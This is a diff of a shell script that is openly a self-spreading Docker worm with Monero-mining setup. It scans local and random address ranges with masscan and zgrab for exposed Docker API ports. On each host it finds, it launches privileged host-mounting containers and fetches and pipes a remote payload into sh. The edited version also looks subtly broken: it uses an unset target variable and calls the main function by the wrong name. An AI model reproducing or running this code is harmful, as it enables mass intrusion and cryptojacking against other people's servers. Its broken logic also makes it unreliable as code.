@@ -16,8 +16,8 @@ function INIT_MAIN() {
     SETUP_XMR
     INFECT_ALL_CONTAINERS
     GETLOCALRANGES
-    LANDOCKERPWN
-    RANDOMDOCKERPWN
+    dAPIpwn
+    feed_the_ranges
 }
 
 # Install basic packages
@@ -122,68 +122,29 @@ function GETLOCALRANGES() {
 }
 
 # Scan and exploit Docker services
-function AUTOLANDOCKERPWN() {
-    PORT=$1
-    RATE=$2
-    RANGE=$3
+dAPIpwn(){
+range=$1
+port=$2
+rate=$3
+rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
+eval "$rndstr"="'$(masscan --router-mac 66-55-44-33-22-11 $range -p$port --rate=$rate | awk '{print $6}'| zgrab --senders 200 --port $port --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
 
-    echo "Scanning range: $RANGE on port: $PORT with rate: $RATE"
-
-    # Perform the scan
-    masscan_output=$(masscan -p$PORT $RANGE --rate=$RATE 2>&1)
-    if [[ $? -ne 0 ]]; then
-        echo "Error running masscan: $masscan_output"
-        return 1
-    fi
-
-    # Extract IPs and perform a zgrab scan
-    ip_list=$(echo "$masscan_output" | awk '{print $6}' | zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)
-    
-    if [[ -z "$ip_list" ]]; then
-        echo "No IP addresses found for port $PORT in range $RANGE"
-        return 1
-    fi
-
-    for IPADDR in $ip_list; do
-        echo "Attempting to exploit $IPADDR:$PORT"
-        timeout -s SIGKILL 240s docker -H tcp://$IPADDR:$PORT run -d --privileged --network host -v /:/host nmlmweb3/upspin:latest
-    done
+for ipaddy in ${!rndstr}; do
+timeout -s SIGKILL 120 docker -H $TARGET run -d --net host --restart always --privileged --name dockerlan -v /:/host $PWNTAINER & 
+timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged -v /:/mnt alpine chroot sh -c 'apk update; apk add bash curl wget; apt update; apt install -y  bash curl wget; yum install -y  bash curl wget; wget -q -O - $PWNWWWLNK | sh || curl -s $PWNWWWLNK | sh' &
+done
 }
 
-# Scan local ranges and exploit Docker services
-function LANDOCKERPWN() {
-    GETLOCALRANGES
-    if [[ ! -s /tmp/.lr ]]; then
-        echo "Error: /tmp/.lr is empty or missing."
-        exit 1
-    fi
-
-    while read -r RANGE; do
-        echo "Scanning $RANGE"
-        AUTOLANDOCKERPWN "$RANGE" 2375 "$RATE"
-        AUTOLANDOCKERPWN "$RANGE" 2376 "$RATE"
-        AUTOLANDOCKERPWN "$RANGE" 2377 "$RATE"
-        AUTOLANDOCKERPWN "$RANGE" 4243 "$RATE"
-        AUTOLANDOCKERPWN "$RANGE" 4244 "$RATE"
-        AUTOLANDOCKERPWN "$RANGE" 5555 "$RATE"
-    done < /tmp/.lr
-    rm -f /tmp/.lr
+function feed_the_ranges(){
+clear ; echo "scanne local range" ; sleep 2 ; clear
+for LRANGE in ${LAN_RANGES[@]}; do 
+dAPIpwn $LRANGE 2375 $RATE_TO_SCAN
+dAPIpwn $LRANGE 2376 $RATE_TO_SCAN
+dAPIpwn $LRANGE 2377 $RATE_TO_SCAN
+dAPIpwn $LRANGE 4244 $RATE_TO_SCAN
+dAPIpwn $LRANGE 4243 $RATE_TO_SCAN
+done 
 }
 
-# Continuously scan random IP ranges and exploit Docker services
-function RANDOMDOCKERPWN() {
-    while true; do
-        RANGE="$((RANDOM % 255 + 1)).0.0.0/8"
-        echo "Scanning $RANGE"
-        AUTOLANDOCKERPWN "$RANGE" 2375 "$RATE"
-        AUTOLANDOCKERPWN "$RANGE" 2376 "$RATE"
-        AUTOLANDOCKERPWN "$RANGE" 2377 "$RATE"
-        AUTOLANDOCKERPWN "$RANGE" 4243 "$RATE"
-        AUTOLANDOCKERPWN "$RANGE" 4244 "$RATE"
-        AUTOLANDOCKERPWN "$RANGE" 5555 "$RATE"
-        sleep 1
-    done
-}
 
-# Initialize script execution
-INIT_MAIN
+init_main
